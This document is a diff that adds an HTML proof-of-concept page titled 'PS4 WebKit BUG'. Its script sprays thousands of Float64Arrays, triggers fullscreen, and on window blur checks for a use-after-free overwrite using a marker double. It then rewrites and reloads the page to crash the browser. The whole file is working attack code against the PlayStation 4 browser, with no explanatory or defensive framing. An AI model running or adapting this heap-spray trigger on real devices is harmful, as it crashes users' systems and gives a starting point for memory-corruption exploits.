@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>PS4 WebKit BUG</title>
+</head>
+<body>
+
+<h1>Fullscreen Crash </h1>
+
+<button onclick="runCrashPoC()">Run</button>
+<div id="crash-result"></div>
+
+<script>
+function runCrashPoC() {
+    const result = document.getElementById('crash-result');
+    result.innerHTML = '<h4>Press OPTIONS button</h4>';   
+    
+    let controllers = [];
+    const PATTERN = 2.121995791e-314;
+    
+    for(let i = 0; i < 5000; i++) {
+        let arr = new Float64Array(8);
+        arr[0] = i;
+        controllers.push(arr);
+    }
+    
+    const elem = document.documentElement;
+    if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+    
+    window.onblur = function() {
+        result.innerHTML += '<p>UAF triggered</p>';
+        
+        let spray = [];
+        for(let i = 0; i < 8000; i++) {
+            let p = new Float64Array(10);
+            p.fill(PATTERN);
+            spray.push(p);
+        }
+        
+        let corrupted = null;
+        for(let i = 0; i < controllers.length; i++) {
+            if (controllers[i][0] === PATTERN) {
+                corrupted = controllers[i];
+                break;
+            }
+        }
+        
+        if (corrupted) {         
+            
+            setTimeout(() => {
+                // This specific sequence triggers crash
+                document.open();
+                document.write('<html><body><h1>Crash</h1></body></html>');
+                document.close();
+                setTimeout(() => location.reload(), 500);
+            }, 3000);
+        }
+    };
+}
+</script>
+</body>
+</html>
